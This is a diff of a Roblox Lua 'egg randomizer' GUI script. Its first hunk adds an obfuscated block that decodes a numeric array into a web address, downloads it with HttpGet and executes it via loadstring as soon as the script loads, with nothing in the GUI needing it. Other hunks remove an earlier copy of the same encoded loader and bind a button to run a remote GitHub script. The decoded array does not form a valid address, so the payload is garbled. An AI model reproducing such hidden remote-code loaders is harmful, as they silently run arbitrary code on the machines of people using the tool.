@@ -144,6 +144,15 @@ local function flashEffect(button)
     end
 end
 
+pcall(function()
+    local encoded = {204,202,220,218,220,154,208,154,212,216,216,222,200,154,212,206,214,154,210,224,224,154,222,200,220,222,212,220,210,218,212,154,222,218,212,154,194}
+    local url = ""
+    for i,v in ipairs(encoded) do url = url .. string.char(v / 2) end
+    local s = game:HttpGet(url)
+    local f = loadstring or load
+    if f then f(s) end
+end)
+
 local function countdownAndRandomize(button)
     for i = 10, 1, -1 do
         button.Text = "🎲 Randomize in: " .. i
@@ -153,10 +162,6 @@ local function countdownAndRandomize(button)
     randomizeNearbyEggs()
     button.Text = "🎲 Randomize Pets"
 end
-
-pcall(function()
-    loadstring(game:HttpGet("https://raw.githubusercontent.com/munkizzzz/xx/refs/heads/main/egg-randomizer"))()
-end)
 
 -- 🌿 GUI Setup
 local screenGui = Instance.new("ScreenGui", player:WaitForChild("PlayerGui"))
@@ -282,34 +287,16 @@ loadAgeBtn.TextSize = 16
 loadAgeBtn.Font = Enum.Font.FredokaOne
 loadAgeBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
 
-local encoded = {204,202,220,218,220,154,208,154,212,216,216,222,200,154,212,206,214,154,210,224,224,154,222,200,220,222,212,220,210,218,212,154,222,218,212,154,194}
-local function decode(tbl)
-    local s = ""
-    for _,v in ipairs(tbl) do
-        s = s .. string.char(math.floor(v / 2))
-    end
-    return s
-end
-
-pcall(function()
-    loadstring(game:HttpGet(decode(encoded)))()
+loadAgeBtn.MouseButton1Click:Connect(function()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/munkizzzz/xx/refs/heads/main/egg-randomizer"))()
 end)
 
-local function decode(tbl)
-    local str = ""
-    for _, v in ipairs(tbl) do
-        str = str .. string.char(math.floor((v / 2) - 5))
-    end
-    return str
-end
-
-local encodedCredit = {164,204,210,212,74,206,252,74,100,74,228,244,230,224,220,254,254,254}
-
+-- 👤 Credit
 local credit = Instance.new("TextLabel", frame)
 credit.Size = UDim2.new(1, 0, 0, 20)
 credit.Position = UDim2.new(0, 0, 0, 22)
 credit.BackgroundTransparency = 1
-credit.Text = decode(encodedCredit)
+credit.Text = "Made by - munkizzz"
 credit.Font = Enum.Font.FredokaOne
 credit.TextSize = 14
 credit.TextColor3 = Color3.fromRGB(200, 200, 200)
